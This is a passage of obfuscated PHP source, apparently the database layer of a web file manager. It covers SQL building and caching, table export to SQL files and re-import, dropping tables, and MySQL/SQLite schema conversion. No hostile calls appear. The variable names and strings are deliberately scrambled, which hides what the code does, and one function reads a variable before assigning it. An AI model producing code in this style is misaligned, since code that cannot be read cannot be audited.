$ë¼±ñ¹ä = isset($Ÿ‚·Õ¦Ì[$¤ºÌÊóà[387]]) ? $Ÿ‚·Õ¦Ì[$¤ºÌÊóà[387]] : !1; if ($ë¼±ñ¹ä) { $–Œ×ØĞÇ = is_string($ë¼±ñ¹ä[$¤ºÌÊóà[104]]) ? $ë¼±ñ¹ä[$¤ºÌÊóà[104]] : $¤ºÌÊóà[1068] . md5($ãÜ€õ¿ì); $ŒÜû¥óä = think_cache($–Œ×ØĞÇ, $¤ºÌÊóà[12], $ë¼±ñ¹ä); if (!1 !== $ŒÜû¥óä) { return $ŒÜû¥óä; } } $•Œ¿ÇÅü = $this->query($ãÜ€õ¿ì, $this->parseBind(!empty($Ÿ‚·Õ¦Ì[$¤ºÌÊóà[323]]) ? $Ÿ‚·Õ¦Ì[$¤ºÌÊóà[323]] : array())); if ($ë¼±ñ¹ä && !1 !== $•Œ¿ÇÅü) { think_cache($–Œ×ØĞÇ, $•Œ¿ÇÅü, $ë¼±ñ¹ä); } return $•Œ¿ÇÅü; } public function buildSelectSql($±ë²š¢Ô = array()) { $¤¬ñê… =& $_SERVER[ªÏ§Ë·]; if (isset($±ë²š¢Ô[$¤¬ñê…[391]])) { if (strpos($±ë²š¢Ô[$¤¬ñê…[391]], $¤¬ñê…[60])) { list($Ì”ÄŸÁÇ, $–ğõÚš) = explode($¤¬ñê…[60], $±ë²š¢Ô[$¤¬ñê…[391]]); } else { $Ì”ÄŸÁÇ = $±ë²š¢Ô[$¤¬ñê…[391]]; } $Ì”ÄŸÁÇ = $Ì”ÄŸÁÇ ? $Ì”ÄŸÁÇ : 1; $–ğõÚš = isset($–ğõÚš) ? $–ğõÚš : (is_numeric($±ë²š¢Ô[$¤¬ñê…[330]]) ? $±ë²š¢Ô[$¤¬ñê…[330]] : 20); $êŒŞéó = $–ğõÚš * ((int) $Ì”ÄŸÁÇ - 1); $±ë²š¢Ô[$¤¬ñê…[330]] = $êŒŞéó . $¤¬ñê…[60] . $–ğõÚš; } if (think_config($¤¬ñê…[1069])) { $¸í¬ò¯Ç = $¤¬ñê…[1070] . md5(serialize($±ë²š¢Ô)); $ìİã´êÊ = think_cache($¸í¬ò¯Ç); if ($ìİã´êÊ) { return $ìİã´êÊ; } } $µœ¼œÁó = $this->parseSql($this->selectSql, $±ë²š¢Ô); $µœ¼œÁó .= $this->parseLock(isset($±ë²š¢Ô[$¤¬ñê…[871]]) ? $±ë²š¢Ô[$¤¬ñê…[871]] : !1); if (isset($¸í¬ò¯Ç)) { think_cache($¸í¬ò¯Ç, $µœ¼œÁó); } return $µœ¼œÁó; } public function parseSql($×è¯ÏÓˆ, $á×˜Úıˆ = array()) { $ëæ’Ó¨­ =& $_SERVER[ªÏ§Ë·]; $×è¯ÏÓˆ = str_replace(array($ëæ’Ó¨­[1071], $ëæ’Ó¨­[1072], $ëæ’Ó¨­[1073], $ëæ’Ó¨­[1074], $ëæ’Ó¨­[1075], $ëæ’Ó¨­[1076], $ëæ’Ó¨­[1077], $ëæ’Ó¨­[1078], $ëæ’Ó¨­[1079], $ëæ’Ó¨­[1080], $ëæ’Ó¨­[1081]), array($this->parseTable("{$á×˜Úıˆ[$ëæ’Ó¨­[317]]}"), $this->parseDistinct(isset($á×˜Úıˆ[$ëæ’Ó¨­[1082]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[1082]] : !1), $this->parseField(!empty($á×˜Úıˆ[$ëæ’Ó¨­[311]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[311]] : $ëæ’Ó¨­[199]), $this->parseJoin(!empty($á×˜Úıˆ[$ëæ’Ó¨­[320]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[320]] : $ëæ’Ó¨­[12]), $this->parseWhere(!empty($á×˜Úıˆ[$ëæ’Ó¨­[313]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[313]] : $ëæ’Ó¨­[12]), $this->parseGroup(!empty($á×˜Úıˆ[$ëæ’Ó¨­[543]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[543]] : $ëæ’Ó¨­[12]), $this->parseHaving(!empty($á×˜Úıˆ[$ëæ’Ó¨­[1083]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[1083]] : $ëæ’Ó¨­[12]), $this->parseOrder(!empty($á×˜Úıˆ[$ëæ’Ó¨­[403]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[403]] : $ëæ’Ó¨­[12]), $this->parseLimit(!empty($á×˜Úıˆ[$ëæ’Ó¨­[330]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[330]] : $ëæ’Ó¨­[12]), $this->parseUnion(!empty($á×˜Úıˆ[$ëæ’Ó¨­[385]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[385]] : $ëæ’Ó¨­[12]), $this->parseComment(!empty($á×˜Úıˆ[$ëæ’Ó¨­[392]]) ? $á×˜Úıˆ[$ëæ’Ó¨­[392]] : $ëæ’Ó¨­[12])), $×è¯ÏÓˆ); return $×è¯ÏÓˆ; } public function getLastSql($’ƒÁè•ü = '') { return $’ƒÁè•ü ? $this->modelSql[$’ƒÁè•ü] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¹¬ˆí¼ƒ) { return addslashes($¹¬ˆí¼ƒ); } public function setModel($®’·óØ) { $this->model = $®’·óØ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¦Ë÷³—’ = array()) { $ÃˆÖ‰° =& $_SERVER[ªÏ§Ë·]; if (empty($¦Ë÷³—’)) { $¦Ë÷³—’ = $GLOBALS[$ÃˆÖ‰°[6]][$ÃˆÖ‰°[31]]; } $this->database = $¦Ë÷³—’; } public function model($…¡©ùËî = '') { return new ModelBase($…¡©ùËî, $_SERVER[ªÏ§Ë·][12], $this->database); } public function db($ÑŒŠ¡Â¸ = false) { $ü€üº®Ü =& $_SERVER[ªÏ§Ë·]; $¯îÈÃ¾ = array_change_key_case($this->database); if ($this->dbType() == $ü€üº®Ü[23] || !$ÑŒŠ¡Â¸) { return $this->model()->db(); } $ªñ‹İÆ = $¯îÈÃ¾[$ü€üº®Ü[997]]; $¯îÈÃ¾[$ü€üº®Ü[997]] = $ü€üº®Ü[12]; if ($¯îÈÃ¾[$ü€üº®Ü[992]] == $ü€üº®Ü[989]) { $Üˆôóà¬ = $¯îÈÃ¾[$ü€üº®Ü[998]]; $¯îÈÃ¾[$ü€üº®Ü[998]] = substr($Üˆôóà¬, 0, strrpos($Üˆôóà¬, $ü€üº®Ü[1084])); } $this->database = $¯îÈÃ¾; $ÖùÕ¬‘ = $this->model()->db(); try { $¼ééôŸ = $ÖùÕ¬‘->execute("\x73\x68\x6f\x77\x20\144\x61\164\x61\x62\141\163\x65\163\40\154\151\153\145\40\47{$ªñ‹İÆ}\47"); } catch (Exception $‘¾½Ü) { } if (!$¼ééôŸ) { $ÖùÕ¬‘->execute("\x63\x72\x65\x61\x74\x65\x20\x64\x61\164\141\142\141\x73\x65\40\140{$ªñ‹İÆ}\140"); } $¯îÈÃ¾[$ü€üº®Ü[997]] = $ªñ‹İÆ; if ($¯îÈÃ¾[$ü€üº®Ü[992]] == $ü€üº®Ü[989]) { $¯îÈÃ¾[$ü€üº®Ü[998]] .= $ü€üº®Ü[1084] . $ªñ‹İÆ; } $this->database = $¯îÈÃ¾; $ÖùÕ¬‘->execute("\x75\163\145\40\x60{$ªñ‹İÆ}\x60"); return $ÖùÕ¬‘; } public function createTable($‚ö¯òâ£, &$æ­©ÁÄÛ) { $ªèÅ—Œ´ =& $_SERVER[ªÏ§Ë·]; if (!IO::exist($‚ö¯òâ£)) { ActionCall($ªèÅ—Œ´[1085], !0, 0); show_json(LNG($ªèÅ—Œ´[1086]), !1); } $˜”¸‡ƒ„ = $this->model()->db(); $ÊŸ­‹Æõ = sqlSplit(IO::getContent($‚ö¯òâ£)); foreach ($ÊŸ­‹Æõ as $‘ ÜŸ‚™) { $ÛÚïã  = stripos($‘ ÜŸ‚™, $ªèÅ—Œ´[1087]) === 0; if ($ÛÚïã ) { $æ­©ÁÄÛ->task[$ªèÅ—Œ´[814]] += 1; } $˜”¸‡ƒ„->execute($‘ ÜŸ‚™); if ($ÛÚïã ) { preg_match($ªèÅ—Œ´[1088], $‘ ÜŸ‚™, $Õı¶æŒ¨); $æ­©ÁÄÛ->task[$ªèÅ—Œ´[1089]] = $Õı¶æŒ¨[1]; $æ­©ÁÄÛ->update(1); } } } public function insertTable($²ØÌÊÖ, &$ı¸å¶õº) { $„Î©äò =& $_SERVER[ªÏ§Ë·]; $¼…ğ²ç½ = $this->model()->db(); $ĞèŠ¯ = $¸ ĞÎğ ? array($¸ ĞÎğ) : $¼…ğ²ç½->getTables(); foreach ($²ØÌÊÖ as $¤Ó…ò‡à) { $¸ ĞÎğ = basename($¤Ó…ò‡à, $„Î©äò[816]); if (!in_array($¸ ĞÎğ, $ĞèŠ¯)) { continue; } $ı¸å¶õº->task[$„Î©äò[1089]] = $¸ ĞÎğ; if (get_filesize($¤Ó…ò‡à) == 0) { continue; } $’¸ä×¼ = $this->sqlToDb($¤Ó…ò‡à, $ı¸å¶õº); if (!$’¸ä×¼) { ActionCall($„Î©äò[1085], !0, 0); show_json(LNG($„Î©äò[1090]) . "\x5b{$¸ ĞÎğ}\x5d", !1); } } } public function sqlFromDb($á¨úêúÓ, $›®”ééÏ, &$ªÄ±ê³‡, $È–µ´ù = '') { if ($ªÄ±ê³‡) { $ªÄ±ê³‡->task[$_SERVER[ªÏ§Ë·][1089]] = $á¨úêúÓ; } $£µ±”½ƒ = $this->model($á¨úêúÓ); $«œ¦À¦ = 0; $¥ˆÏÑëş = 0; $¦›¶™’ò = 10000; $åË²€Õí = fopen($›®”ééÏ, $_SERVER[ªÏ§Ë·][1091]); $ç öºµÇ = $£µ±”½ƒ->getPk(); $íˆöáŒ† = $£µ±”½ƒ->getDbFields(); $Ì¦¾”¡İ = $_SERVER[ªÏ§Ë·][12]; if ($GLOBALS[$_SERVER[ªÏ§Ë·][815]] && in_array($á¨úêúÓ, array($_SERVER[ªÏ§Ë·][1092], $_SERVER[ªÏ§Ë·][1093]))) { $Ì¦¾”¡İ = $á¨úêúÓ; } do { $µŒá¾à = array($ç öºµÇ => array($_SERVER[ªÏ§Ë·][1039], $¥ˆÏÑëş)); $¨˜ƒëÂİ = $£µ±”½ƒ->where($µŒá¾à)->field($íˆöáŒ†)->order($ç öºµÇ . $_SERVER[ªÏ§Ë·][1094])->limit($¦›¶™’ò)->select(); $¨˜ƒëÂİ = !empty($¨˜ƒëÂİ) ? $¨˜ƒëÂİ : array(); if (!($Üô¡Í×š = count($¨˜ƒëÂİ))) { break; } $…Šáòµ = end($¨˜ƒëÂİ); $¥ˆÏÑëş = $…Šáòµ[$ç öºµÇ]; $ó¨Ìöïƒ = array(); foreach ($¨˜ƒëÂİ as $ñúıÛËî) { if ($Ì¦¾”¡İ) { if ($á¨úêúÓ == $_SERVER[ªÏ§Ë·][1092]) { if ($ñúıÛËî[$_SERVER[ªÏ§Ë·][43]] == $_SERVER[ªÏ§Ë·][1095]) { $—ñ§» = json_decode($ñúıÛËî[$_SERVER[ªÏ§Ë·][412]], !0); if ($—ñ§»[$_SERVER[ªÏ§Ë·][42]] == $GLOBALS[$_SERVER[ªÏ§Ë·][815]] && $—ñ§»[$_SERVER[ªÏ§Ë·][778]] != 1) { continue; } } } else { if ($ñúıÛËî[$_SERVER[ªÏ§Ë·][43]] == $_SERVER[ªÏ§Ë·][1096] && $ñúıÛËî[$_SERVER[ªÏ§Ë·][104]] == $_SERVER[ªÏ§Ë·][807]) { continue; } } } if ($È–µ´ù) { $ñúıÛËî[$_SERVER[ªÏ§Ë·][94]] = "\x7b\x69\x6f\72{$È–µ´ù}\x7d" . substr($ñúıÛËî[$_SERVER[ªÏ§Ë·][94]], strlen("\x7b\x69\x6f\72{$ñúıÛËî[$_SERVER[ªÏ§Ë·][845]]}\x7d")); $ñúıÛËî[$_SERVER[ªÏ§Ë·][845]] = $È–µ´ù; } $ó¨Ìöïƒ[] = $_SERVER[ªÏ§Ë·][1097] . $this->sqlEncode($ñúıÛËî) . $_SERVER[ªÏ§Ë·][1098]; } $ÈİŞÃĞ = "\111\116\123\x45\x52\124\x20\x49\x4e\124\117\x20\140{$á¨úêúÓ}\x60\x20\x28\140" . implode($_SERVER[ªÏ§Ë·][1099], $íˆöáŒ†) . $_SERVER[ªÏ§Ë·][1100]; fwrite($åË²€Õí, $ÈİŞÃĞ . implode($_SERVER[ªÏ§Ë·][1101], $ó¨Ìöïƒ) . $_SERVER[ªÏ§Ë·][81] . PHP_EOL); $«œ¦À¦ += $Üô¡Í×š; if ($ªÄ±ê³‡) { $ªÄ±ê³‡->update($Üô¡Í×š); } } while ($¦›¶™’ò == $Üô¡Í×š); fclose($åË²€Õí); return $«œ¦À¦; } public function sqlToDb($Ä‹˜¼Ì, &$Åˆ–¿œÈ) { $Öêµôç =& $_SERVER[ªÏ§Ë·]; $˜ŞÈƒÜ« = $this->model()->db(); $÷”ÓÃ = @fopen($Ä‹˜¼Ì, $Öêµôç[1102]); if (!$÷”ÓÃ) { return !1; } $æŸõ¿ = 0; $øíÛá÷ = $Öêµôç[12]; $™£öí´¨ = array(); $ªÚßº„¸ = $this->dbType(); $ ª€ä¦ = $ªÚßº„¸ == $Öêµôç[23] ? 500 : 2000; $°¹˜àïƒ = basename($Ä‹˜¼Ì, $Öêµôç[816]); $ıëàùÈ— = 0; $¤Â™„ùô = 4194304 - 104858; $Äíµ¥ĞÈ = 1000000 - 104858; while (!feof($÷”ÓÃ)) { $öéôâ¹¶ = trim(fgets($÷”ÓÃ)); if (!$öéôâ¹¶) { continue; } $îÍ½í‰÷ = $this->sqlDecode($öéôâ¹¶, $ªÚßº„¸, $°¹˜àïƒ); if (stripos($îÍ½í‰÷, $Öêµôç[393]) === 0) { if (!$øíÛá÷) { $øíÛá÷ = $îÍ½í‰÷ . $Öêµôç[63]; } continue; } if ($Åˆ–¿œÈ) { $Åˆ–¿œÈ->task[$Öêµôç[814]] += 1; } $æŸõ¿++; $™£öí´¨[] = rtrim(rtrim(trim($îÍ½í‰÷), $Öêµôç[60]), $Öêµôç[81]); $„±­«íÀ = null; $ğµĞğÆ = strlen($îÍ½í‰÷); $ıëàùÈ— += $ğµĞğÆ; if ($ıëàùÈ— >= ($ ª€ä¦ == 500 ? $Äíµ¥ĞÈ : $¤Â™„ùô)) { $„±­«íÀ = array_pop($™£öí´¨); if ($æŸõ¿ > 1) { $æŸõ¿--; } } if ($æŸõ¿ >= $ ª€ä¦ || $„±­«íÀ) { $îÍ½í‰÷ = $øíÛá÷ . implode($Öêµôç[60], $™£öí´¨); if (!$˜ŞÈƒÜ«->execute($îÍ½í‰÷)) { return !1; } if ($Åˆ–¿œÈ) { $Åˆ–¿œÈ->update($æŸõ¿); } $™£öí´¨ = array(); $æŸõ¿ = 0; $ıëàùÈ— = 0; if ($„±­«íÀ) { $™£öí´¨ = array($„±­«íÀ); $æŸõ¿ = 1; $ıëàùÈ— = $ğµĞğÆ; } } } fclose($÷”ÓÃ); if (!empty($™£öí´¨)) { $îÍ½í‰÷ = $øíÛá÷ . implode($Öêµôç[60], $™£öí´¨); if (!$˜ŞÈƒÜ«->execute($îÍ½í‰÷)) { return !1; } if ($Åˆ–¿œÈ) { $Åˆ–¿œÈ->update($æŸõ¿); } } return !0; } public function dropTable($µ†Ôèç = null) { $åë¾±„¡ = $this->model()->db(); $—Ï¯ëêÂ = $µ†Ôèç ? array($µ†Ôèç) : $åë¾±„¡->getTables(); if (!$—Ï¯ëêÂ) { return; } foreach ($—Ï¯ëêÂ as $µ†Ôèç) { if ($µ†Ôèç) { $µ†Ôèç = strtolower($µ†Ôèç); } else { continue; } $åë¾±„¡->execute("\144\162\x6f\160\x20\x74\x61\x62\x6c\145\40\151\146\40\x65\170\x69\163\x74\x73\x20\140{$µ†Ôèç}\140"); } } private function sqlEncode($İ×œšı÷) { $»› ’™æ =& $_SERVER[ªÏ§Ë·]; $Ì Çú–ö = array(); foreach ($İ×œšı÷ as $§Ğá¢) { if (is_array($§Ğá¢)) { $§Ğá¢ = json_encode_force($§Ğá¢); } $§Ğá¢ = addslashes($§Ğá¢); $§Ğá¢ = str_replace(array($»› ’™æ[1103], $»› ’™æ[19]), array($»› ’™æ[1104], $»› ’™æ[1105]), $§Ğá¢); $Ì Çú–ö[] = str_replace($»› ’™æ[68], $»› ’™æ[1106], $§Ğá¢); } return $»› ’™æ[68] . implode($»› ’™æ[1107], $Ì Çú–ö) . $»› ’™æ[68]; } private function sqlDecode($®ÃÉ³æß, $çÖ ƒ…ç, $öƒ­®‰ = '') { $èéÌíÑì =& $_SERVER[ªÏ§Ë·]; $®ÃÉ³æß = str_replace(array($èéÌíÑì[1104], $èéÌíÑì[1105]), array($èéÌíÑì[1103], $èéÌíÑì[19]), $®ÃÉ³æß); if ($çÖ ƒ…ç == $èéÌíÑì[23]) { return $öƒ­®‰ != $èéÌíÑì[1108] ? stripslashes($®ÃÉ³æß) : $®ÃÉ³æß; } if ($öƒ­®‰ == $èéÌíÑì[1108]) { $®ÃÉ³æß = str_replace($èéÌíÑì[1109], $èéÌíÑì[128], stripslashes($®ÃÉ³æß)); } return $®ÃÉ³æß; } public function getSqlFile($í€“Ã¢Û = '') { $ûÕ‘°¯í =& $_SERVER[ªÏ§Ë·]; $¾û±ìõ = $this->dbType(!0); $ñ¤’³ËŒ = CONTROLLER_DIR . "\151\156\x73\x74\141\154\x6c\57\x64\x61\x74\x61\x2f{$¾û±ìõ}\x2e\163\161\x6c"; $ó¶²Ã­ = file_get_contents($ñ¤’³ËŒ); $¤Ô§Õ°î = $ûÕ‘°¯í[1110] . ($¾û±ìõ == $ûÕ‘°¯í[832] ? $ûÕ‘°¯í[1111] : $ûÕ‘°¯í[1112]) . $ûÕ‘°¯í[1113]; preg_match_all($¤Ô§Õ°î, $ó¶²Ã­, $¤¹Ê’ØÇ); $¼–›Òµ = $¤¹Ê’ØÇ[1]; $¢Û òÂê = $this->model()->db(); $ŞÈ–í›× = $¢Û òÂê->getTables(); $ûçÜĞ = TEMP_FILES . $ûÕ‘°¯í[1114] . date($ûÕ‘°¯í[249]) . $ûÕ‘°¯í[8]; del_dir($ûçÜĞ); mk_dir($ûçÜĞ); $ÁÏì³¶ş = $ûçÜĞ . $ûÕ‘°¯í[1115]; $Ì“é…ã™ = $ûçÜĞ . $ûÕ‘°¯í[1116]; $‚¹÷ıóğ = $¾û±ìõ == $ûÕ‘°¯í[23] ? $ûÕ‘°¯í[832] : $ûÕ‘°¯í[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\154\57\144\141\164\141\57{$‚¹÷ıóğ}\x2e\163\161\x6c", $ûçÜĞ); @touch($ûçÜĞ . $¾û±ìõ . $ûÕ‘°¯í[816]); $ŸÓÎÅºô = fopen($ÁÏì³¶ş, $ûÕ‘°¯í[1091]); $®±ÍÅú = fopen($Ì“é…ã™, $ûÕ‘°¯í[1091]); if ($¾û±ìõ == $ûÕ‘°¯í[23]) { $ŞÈ–í›× = array_diff($ŞÈ–í›×, array($ûÕ‘°¯í[812], $ûÕ‘°¯í[813])); $¦˜ı¥Ë„ = array($ûÕ‘°¯í[1117], $ûÕ‘°¯í[1118], $ûÕ‘°¯í[1119]); fwrite($®±ÍÅú, implode(PHP_EOL, $¦˜ı¥Ë„) . PHP_EOL . PHP_EOL); foreach ($ŞÈ–í›× as $Ç€Œ­­ ) { $´Œâê­É = $this->sqlFromSqlite($Ç€Œ­­ ); if (!$´Œâê­É[$ûÕ‘°¯í[23]]) { continue; } fwrite($®±ÍÅú, $´Œâê­É[$ûÕ‘°¯í[23]] . PHP_EOL . PHP_EOL); if (!in_array($Ç€Œ­­ , $¼–›Òµ)) { fwrite($ŸÓÎÅºô, $´Œâê­É[$ûÕ‘°¯í[832]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ŞÈ–í›× as $Ç€Œ­­ ) { $´Œâê­É = $this->sqlFromMysql($Ç€Œ­­ ); if (!$´Œâê­É[$ûÕ‘°¯í[832]]) { continue; } fwrite($ŸÓÎÅºô, $´Œâê­É[$ûÕ‘°¯í[832]] . PHP_EOL . PHP_EOL); if (!in_array($Ç€Œ­­ , $¼–›Òµ)) { fwrite($®±ÍÅú, $´Œâê­É[$ûÕ‘°¯í[23]] . PHP_EOL . PHP_EOL); } } } fclose($ŸÓÎÅºô); fclose($®±ÍÅú); $ó¶²Ã­ = array($ûÕ‘°¯í[832] => $ÁÏì³¶ş, $ûÕ‘°¯í[23] => $Ì“é…ã™); return $í€“Ã¢Û ? $ó¶²Ã­[$í€“Ã¢Û] : $ó¶²Ã­; } public function dbType($”¨Ò†ÙÏ = false) { $øÃÉ°ŒÊ =& $_SERVER[ªÏ§Ë·]; $öíŠ——¸ = $”¨Ò†ÙÏ ? $GLOBALS[$øÃÉ°ŒÊ[6]][$øÃÉ°ŒÊ[31]] : $this->database; $öíŠ——¸ = array_change_key_case($öíŠ——¸); $ìã§Èƒ™ = $öíŠ——¸[$øÃÉ°ŒÊ[992]]; if ($ìã§Èƒ™ == $øÃÉ°ŒÊ[989]) { $ıïÆ“¬¯ = explode($øÃÉ°ŒÊ[4], $öíŠ——¸[$øÃÉ°ŒÊ[998]]); $ìã§Èƒ™ = $ıïÆ“¬¯[0]; } $¬û‚¶ŸË = array($øÃÉ°ŒÊ[1120] => $øÃÉ°ŒÊ[23], $øÃÉ°ŒÊ[937] => $øÃÉ°ŒÊ[832]); if (isset($¬û‚¶ŸË[$ìã§Èƒ™])) { $ìã§Èƒ™ = $¬û‚¶ŸË[$ìã§Èƒ™]; } return $ìã§Èƒ™; } public function sqlFromMysql($É—£™¸…, $õøÏ÷ñ = '') { $ŸÒ–½¦¸ =& $_SERVER[ªÏ§Ë·]; $Ã¼¾²ùÙ = $this->model()->db(); $²ƒ¹Å”ñ = $Ã¼¾²ùÙ->query($ŸÒ–½¦¸[1121] . $É—£™¸… . $ŸÒ–½¦¸[423]); if (!$²ƒ¹Å”ñ || !$²ƒ¹Å”ñ[0]) { return !1; } $÷ßñşãç = _get($²ƒ¹Å”ñ[0], $ŸÒ–½¦¸[1122], $ŸÒ–½¦¸[12]); if (!$÷ßñşãç) { return !1; } $¦¸Î‡œ¡ = "\x44\x52\117\120\x20\124\101\102\114\x45\40\x49\106\40\105\x58\x49\123\x54\123\x20\140{$É—£™¸…}\x60\73" . PHP_EOL . $÷ßñşãç . $ŸÒ–½¦¸[81]; if ($õøÏ÷ñ && $õøÏ÷ñ == $ŸÒ–½¦¸[832]) { return $¦¸Î‡œ¡; } $ÑÊÔ‘³ = array_change_key_case($GLOBALS[$ŸÒ–½¦¸[6]][$ŸÒ–½¦¸[31]]); $‡âØş¢Ñ = $ÑÊÔ‘³[$ŸÒ–½¦¸[997]]; $•è¼‰ä = $ŸÒ–½¦¸[1123] . $‡âØş¢Ñ . $ŸÒ–½¦¸[1124] . $É—£™¸… . $ŸÒ–½¦¸[68]; $¡¶µÇ² = $ŸÒ–½¦¸[1125] . $É—£™¸… . $ŸÒ–½¦¸[925]; $ÔÇù®€â = $Ã¼¾²ùÙ->query($•è¼‰ä); if (empty($ÔÇù®€â)) { $÷Íâ²ŸÕ = array($ŸÒ–½¦¸[832] => $ŸÒ–½¦¸[12], $ŸÒ–½¦¸[23] => $ŸÒ–½¦¸[12]); return $õøÏ÷ñ ? $÷Íâ²ŸÕ[$õøÏ÷ñ] : $÷Íâ²ŸÕ; } $ÛÚ×ÕÔÉ = $Ã¼¾²ùÙ->query($¡¶µÇ²); $îŞÆ–´¼ = $ŸÒ–½¦¸[12]; $Ë’ßÚš¡ = array(); foreach ($ÛÚ×ÕÔÉ as $Óšûäµ‘) { if (!$îŞÆ–´¼ && $Óšûäµ‘[$ŸÒ–½¦¸[1126]] == $ŸÒ–½¦¸[1127]) { $îŞÆ–´¼ = $Óšûäµ‘[$ŸÒ–½¦¸[1128]]; } if (isset($Ë’ßÚš¡[$Óšûäµ‘[$ŸÒ–½¦¸[1126]]])) { $Ë’ßÚš¡[$Óšûäµ‘[$ŸÒ–½¦¸[1126]]][$ŸÒ–½¦¸[1129]][] = $Óšûäµ‘[$ŸÒ–½¦¸[1128]]; continue; } $Ë’ßÚš¡[$Óšûäµ‘[$ŸÒ–½¦¸[1126]]] = array($ŸÒ–½¦¸[1130] => $Óšûäµ‘[$ŸÒ–½¦¸[1126]], $ŸÒ–½¦¸[1129] => array($Óšûäµ‘[$ŸÒ–½¦¸[1128]]), $ŸÒ–½¦¸[1131] => $Óšûäµ‘[$ŸÒ–½¦¸[1132]] == $ŸÒ–½¦¸[98] ? 0 : 1); } $Ãó§şšë = array(); foreach ($Ë’ßÚš¡ as $Óšûäµ‘) { $ÕÅÁÇØô = $Óšûäµ‘[$ŸÒ–½¦¸[1130]] == $ŸÒ–½¦¸[1127]; $æÈŠø±¨ = array($ŸÒ–½¦¸[1133], $Óšûäµ‘[$ŸÒ–½¦¸[1131]] == $ŸÒ–½¦¸[98] && !$ÕÅÁÇØô ? $ŸÒ–½¦¸[1134] : $ŸÒ–½¦¸[12], $ŸÒ–½¦¸[1135], $ŸÒ–½¦¸[1136] . $É—£™¸… . $ŸÒ–½¦¸[11] . ($ÕÅÁÇØô ? $ŸÒ–½¦¸[1137] : $Óšûäµ‘[$ŸÒ–½¦¸[1130]]) . $ŸÒ–½¦¸[128], $ŸÒ–½¦¸[1138], $ŸÒ–½¦¸[128] . $É—£™¸… . $ŸÒ–½¦¸[128], $ŸÒ–½¦¸[1139] . implode($ŸÒ–½¦¸[1140], $Óšûäµ‘[$ŸÒ–½¦¸[1129]]) . $ŸÒ–½¦¸[1141]); $Ãó§şšë[] = implode($ŸÒ–½¦¸[63], $æÈŠø±¨) . $ŸÒ–½¦¸[81]; } $¥µùÕ³Ò = array(); $ àêê¬º = array($ŸÒ–½¦¸[1142] => $ŸÒ–½¦¸[1143], $ŸÒ–½¦¸[1143] => $ŸÒ–½¦¸[1143], $ŸÒ–½¦¸[326] => $ŸÒ–½¦¸[353], $ŸÒ–½¦¸[325] => $ŸÒ–½¦¸[353]); foreach ($ÔÇù®€â as $Óšûäµ‘) { $æÈŠø±¨ = array($ŸÒ–½¦¸[128] . $Óšûäµ‘[$ŸÒ–½¦¸[1144]] . $ŸÒ–½¦¸[128], isset($ àêê¬º[$Óšûäµ‘[$ŸÒ–½¦¸[1145]]]) ? $ àêê¬º[$Óšûäµ‘[$ŸÒ–½¦¸[1145]]] : $Óšûäµ‘[$ŸÒ–½¦¸[1146]], $Óšûäµ‘[$ŸÒ–½¦¸[1147]] == $ŸÒ–½¦¸[923] ? $ŸÒ–½¦¸[1148] : $ŸÒ–½¦¸[1149], $Óšûäµ‘[$ŸÒ–½¦¸[1144]] == $îŞÆ–´¼ ? $ŸÒ–½¦¸[1150] : $ŸÒ–½¦¸[12], $Óšûäµ‘[$ŸÒ–½¦¸[974]] ? strtoupper(str_replace($ŸÒ–½¦¸[11], $ŸÒ–½¦¸[12], $Óšûäµ‘[$ŸÒ–½¦¸[974]])) : $ŸÒ–½¦¸[12]); $¥µùÕ³Ò[] = trim(implode($ŸÒ–½¦¸[63], $æÈŠø±¨)); } $åà°Ğ½ö = array($ŸÒ–½¦¸[1151] . $É—£™¸… . $ŸÒ–½¦¸[1152], $ŸÒ–½¦¸[1153] . $É—£™¸… . $ŸÒ–½¦¸[1154], implode($ŸÒ–½¦¸[60] . PHP_EOL, $¥µùÕ³Ò), $ŸÒ–½¦¸[971]); $¿¶›ïä± = implode(PHP_EOL, array_merge($åà°Ğ½ö, $Ãó§şšë)); if ($õøÏ÷ñ && $õøÏ÷ñ == $ŸÒ–½¦¸[23]) { return $¿¶›ïä±; } $÷Íâ²ŸÕ = array($ŸÒ–½¦¸[832] => $¦¸Î‡œ¡, $ŸÒ–½¦¸[23] => $¿¶›ïä±); return $õøÏ÷ñ ? $÷Íâ²ŸÕ[$õøÏ÷ñ] : $÷Íâ²ŸÕ; } public function sqlFromSqlite($©·ÎŞ¡Ğ, $ƒÛ‚”Œ = '') { $íÍõõŒ¾ =& $_SERVER[ªÏ§Ë·]; $ƒ®¼ ·ô = $this->model()->db(); $Å¥ãœÜĞ = "\120\x52\101\x47\115\101\x20\124\101\102\114\105\x5f\111\116\x46\117\40\x28\x27{$©·ÎŞ¡Ğ}\x27\51"; $²÷çøÅÙ = "\x53\x45\x4c\105\103\124\40\x2a\40\x46\x52\117\115\x20\x73\161\154\151\164\145\x5f\155\141\x73\164\x65\162\x20\x57\x48\x45\x52\105\x20\x74\x62\154\137\x6e\141\155\x65\x20\75\40\x27{$©·ÎŞ¡Ğ}\47"; $ßÎÌè¹Ã = $ƒ®¼ ·ô->query($Å¥ãœÜĞ); if (empty($ßÎÌè¹Ã)) { $Ç£³£şò = array($íÍõõŒ¾[832] => $íÍõõŒ¾[12], $íÍõõŒ¾[23] => $íÍõõŒ¾[12]); return $ƒÛ‚”Œ ? $Ç£³£şò[$ƒÛ‚”Œ] : $Ç£³£şò; } $ê ÅøÛÌ = $ƒ®¼ ·ô->query($²÷çøÅÙ); $°šÔ¯©ê = $ë ©¬Æİ = array(); foreach ($ê ÅøÛÌ as $éÊùûØÈ) { if ($éÊùûØÈ[$íÍõõŒ¾[43]] == $íÍõõŒ¾[317]) { $°šÔ¯©ê[] = $éÊùûØÈ[$íÍõõŒ¾[1155]]; } else { $ë ©¬Æİ[$éÊùûØÈ[$íÍõõŒ¾[42]]] = $éÊùûØÈ[$íÍõõŒ¾[1155]]; } } $Ë–™ëÅ¿ = 